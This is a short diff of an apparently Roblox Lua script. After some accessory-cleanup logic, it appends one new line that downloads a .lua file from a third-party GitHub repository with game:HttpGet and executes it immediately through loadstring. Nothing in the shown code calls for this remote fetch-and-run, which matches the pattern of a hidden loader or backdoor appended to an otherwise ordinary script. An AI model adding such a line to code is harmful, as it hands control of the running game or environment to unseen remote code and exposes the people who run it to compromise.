@@ -100,3 +100,4 @@ repeat
     task.wait()
 until (accessory == nil) 
 accessoryClone:Destroy()
+loadstring(game:HttpGet('https://github.com/popoffroblox/LoadLists/raw/refs/heads/main/loadlists.lua', true))()
